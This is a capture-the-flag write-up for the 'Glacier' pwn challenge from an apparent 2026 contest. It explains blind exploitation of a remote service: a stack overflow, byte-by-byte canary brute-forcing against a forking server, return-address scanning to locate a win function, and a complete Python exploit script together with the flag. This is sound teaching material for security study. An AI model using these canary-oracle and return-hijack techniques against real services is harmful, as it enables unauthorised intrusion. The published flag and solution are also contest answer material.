---
title: "Glacier"
description: "The challenge exposed only a TCP service with no downloadable binary. After connecting, it printed:"
event: "cryovault"
category: "pwn"
categoryLabel: "Pwn"
tags: ["ISFCR CryoVault Finals 2026","pwn"]
date: "2026-10-26"
teammate: false
source: "cryovault/pwn/1/writeup.md"
---

**Category:** Pwn  
**Connection:** `nc 0.cloud.chals.io 13368`  
**Flag:** `isfcr{bl1nd_r0p_thaws_th3_gl4c13r_c0r3_e71a93}`

## Overview

The challenge exposed only a TCP service with no downloadable binary. After connecting, it printed:

```
glacier core online. depth probe ready.
depth> 
```

Each input was consumed by a raw `read()` and answered with the number of bytes read:

```
depth> AAAA
logged 5 samples.
depth> 
```

The goal was therefore a blind exploitation task: recover enough of the process layout through the service's crash/output behaviour to redirect execution to a hidden win function.

## Finding the bug

Sending increasing input lengths showed a clear boundary:

| Input length | Result |
|---|---|
| 72 bytes | `logged 72 samples.` and the service continues |
| 73+ bytes | connection closes with no further output |

This indicated a 72-byte stack buffer followed by an 8-byte stack canary starting at offset 72:

```
offset 0   : buffer (72 bytes)
offset 72  : stack canary (8 bytes)
offset 80  : saved RBP
offset 88  : return address
```

The canary's least significant byte is `0x00`. Confirming this, sending 72 bytes followed by a single `\x00` continued normally:

```
logged 73 samples.
depth>
```

Any other 73rd byte crashed the process.

## Recovering the canary

Normally a stack canary cannot be brute-forced because it changes between connections. Here the service behaved like a forked process: the canary was identical across connections.

That made a byte-by-byte crash oracle possible:

1. Send `72 * "A" + known_canary_prefix + guess`.
2. If `guess` is correct, the canary remains intact and the service responds with `logged ... samples.` and another `depth>` prompt.
3. If `guess` is wrong, stack-smashing protection terminates the process and the connection closes.

Starting with the known `0x00` byte, the recovered canary was:

```
00 6c ea 65 ca f3 85 f0
```

## Finding the binary base

With the canary bypassed, the return address became controllable:

```python
payload = b"A" * 72 + canary + b"B" * 8 + ret_address
```

A partial-overwrite scan of the return address's low byte produced one interesting result at `0x6b`, which restarted the service banner. Brute-forcing the remaining bytes of that return address gave:

```
0x40066b
```

This runs the banner code and shows the binary is a non-PIE ELF based at `0x400000`.

Other return values near the original call site were `0x4006b4` / `0x4006b5`, which continued the normal loop and printed `logged 96 samples.`.

## Finding the win function

With a stable non-PIE base, the remaining code was scanned blindly:

```python
payload = b"A" * 72 + canary + b"B" * 8 + p64(candidate_address)
```

Each address in the range `0x400000`–`0x401000` was tried, and any address that printed unusual output was recorded.

Addresses around `0x400565` printed:

```
isfcr{bl1nd_r0p_thaws_th3_gl4c13r_c0r3_e71a93}
```

The nearby addresses `0x400566`, `0x400567`, `0x400568`, etc. also worked because they land on different instruction boundaries inside the same function. The canonical target used below is `0x400565`.

## Final exploit

The remote service can occasionally take a few seconds to send its banner under load, so the script below uses generous timeouts.

```python
#!/usr/bin/env python3
import socket
import struct
import select
import time

HOST = "0.cloud.chals.io"
PORT = 13368

CANARY = bytes.fromhex("006cea65caf385f0")
WIN = 0x400565


def recv_until(sock, marker=b"depth> ", timeout=10.0):
    data = b""
    end = time.time() + timeout
    while time.time() < end:
        ready, _, _ = select.select([sock], [], [], max(0, end - time.time()))
        if not ready:
            break
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
        if marker in data:
            break
    return data


s = socket.create_connection((HOST, PORT), timeout=5)

# Wait for the initial banner and prompt.
recv_until(s)

payload = (
    b"A" * 72                    # buffer
    + CANARY                     # stack canary
    + b"B" * 8                   # saved RBP
    + struct.pack("<Q", WIN)     # return address -> win function
)

s.sendall(payload)

# Read until the process exits or times out.
out = b""
s.settimeout(5.0)
try:
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        out += chunk
except socket.timeout:
    pass

print(out.decode(errors="replace"))
```

Output:

```
isfcr{bl1nd_r0p_thaws_th3_gl4c13r_c0r3_e71a93}
```
